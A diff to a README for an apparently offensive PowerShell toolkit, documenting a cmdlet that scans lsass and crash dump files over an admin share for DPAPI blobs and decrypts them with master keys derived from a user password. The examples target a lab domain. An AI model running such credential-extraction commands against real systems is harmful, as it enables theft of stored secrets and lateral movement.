@@ -750,12 +750,16 @@ Find-TBODpapiBlobs -ServerName corp1-web01.corp1.lab.home-labs.lol -Path tbo:\Us
 
 #### Get-TBODpapiMemoryDump
 
-Scans a memory dump file (minidump/crash dump/raw) for embedded DPAPI blobs by streaming the file and searching for the DPAPI magic header.
+Scans a dump file (process minidump/crash dump/raw) for embedded DPAPI blobs by streaming the file and searching for the DPAPI magic header.
+This is a byte-pattern scan (no dump parsing/decompression), so it only finds DPAPI blobs that appear as contiguous bytes in the dump file.
 Use `-Decrypt` with a master key set (or an already-populated per-session master key cache) to attempt decryption.
 
 ```powershell
 # Scan a dump for DPAPI blobs (metadata only).
 Get-TBODpapiMemoryDump -ServerName corp1-web01.corp1.lab.home-labs.lol -Path '\\corp1-web01.corp1.lab.home-labs.lol\C$\Temp\lsass.dmp'
+
+# Scan a large dump (ex: crash dump); consider -MaxHits to cap work.
+Get-TBODpapiMemoryDump -ServerName corp1-web01.corp1.lab.home-labs.lol -Path '\\corp1-web01.corp1.lab.home-labs.lol\C$\Windows\MEMORY.DMP' -MaxHits 200
 
 # Attempt decryption with a known master key set.
 $userKeys = Get-TBODpapiMasterKeys -ServerName corp1-web01.corp1.lab.home-labs.lol -Scope User -UserPassword 'Passw0rd!'
